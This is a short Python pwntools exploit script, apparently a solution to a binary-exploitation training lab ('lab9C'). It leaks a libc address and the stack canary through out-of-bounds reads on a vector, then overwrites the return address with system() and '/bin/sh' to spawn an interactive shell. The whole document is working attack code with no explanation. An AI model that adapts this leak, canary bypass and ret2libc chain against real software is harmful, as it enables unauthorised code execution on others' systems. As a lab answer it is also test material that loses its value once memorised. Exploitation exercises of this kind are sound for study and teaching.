from pwn import *

BIN_PATH = "/levels/lab09/lab9C"
SYSTEM_OFFSET = 0x2D193
BIN_SH_OFFSET = 0x14DA27

p = process(BIN_PATH)

log.info("Stage #1 - Leaking address & calc system() and /bin/sh")
p.sendline("2")
p.recv()
p.sendline("0")
p.recvuntil("] =")

vector_leak = int(p.recvuntil("\n")) & 0xffffffff
system_addr = vector_leak + SYSTEM_OFFSET
log.info("Found system(): 0x%x" % system_addr)

binsh_addr = vector_leak + BIN_SH_OFFSET
log.info("Found /bin/sh: 0x%x" % binsh_addr)

log.info("Stage #2 - Leaking stack canary")
p.sendline("2")
p.recv()
p.sendline("257")
p.recvuntil("] =")

canary_leak = int(p.recvuntil("\n")) & 0xffffffff
log.info("Found stack canary: 0x%x" % canary_leak)

log.info("Stage #3 - Writing junk to vector & overwriting canary with return address")
for i in range(256):
    p.sendline("1")
    p.sendline(str(i))
    p.recv()

p.sendline("1")
p.sendline(str(canary_leak))

for i in range(3):
    p.sendline("1")
    p.sendline("0")

p.sendline("1")
p.sendline(str(system_addr))

p.sendline("1")
p.sendline("0")

p.sendline("1")
p.sendline(str(binsh_addr))

log.info("Stage #4 - Quitting program and getting shell")
p.sendline("3")
p.recv()

p.interactive()
